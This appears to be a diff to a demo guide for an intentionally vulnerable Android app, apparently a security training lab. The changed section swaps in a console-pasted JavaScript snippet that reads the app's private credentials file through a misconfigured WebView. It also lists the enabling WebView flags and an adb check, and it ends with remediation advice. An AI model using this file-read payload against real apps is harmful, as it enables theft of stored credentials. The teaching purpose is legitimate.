@@ -163,18 +163,19 @@ window.apiKey
 ### Demo Flow - Inject Malicious Code
 
 ```javascript
-// In Chrome DevTools Console, paste:
-var img = new Image();
-img.src = 'file:///data/data/com.example.trustmebro/shared_prefs/api_credentials.xml';
-img.onload = function() {
-    console.log("File accessible: " + img.src);
+// In Chrome DevTools Console, paste this to read local files:
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+        if (xhr.status == 200 || xhr.status == 0) {
+            console.log("File accessible! Content:\n" + xhr.responseText);
+        } else {
+            console.log("File NOT accessible. Status: " + xhr.status);
+        }
+    }
 };
-img.onerror = function() {
-    console.log("File NOT accessible");
-};
-document.body.appendChild(img);
-
-// If onload fires, file access confirmed
+xhr.open("GET", "file:///data/data/com.example.trustmebro/shared_prefs/auth.xml", true);
+xhr.send();
 ```
 
 ### Demo Flow - Extract Credentials
@@ -183,12 +184,11 @@ document.body.appendChild(img);
 # WebView can read local files because:
 # - JavaScript enabled
 # - allowFileAccess = true
-# - No Content Security Policy
+# - allowFileAccessFromFileURLs = true
+# - allowUniversalAccessFromFileURLs = true
 
-# Verify:
-adb pull /data/data/com.example.trustmebro/shared_prefs/api_credentials.xml
-
-# WebView JavaScript can read this same file
+# Verify file exists via ADB:
+adb shell ls /data/data/com.example.trustmebro/shared_prefs/auth.xml
 ```
 
 ## Compositor Overlay Capture
@@ -266,5 +266,3 @@ grep -r "FLAG_SECURE" app/src/
 4. Use parameterized SQL queries
 5. Disable JavaScript in WebView, use ContentSecurityPolicy
 6. Add `FLAG_SECURE` to sensitive activities
-```
-
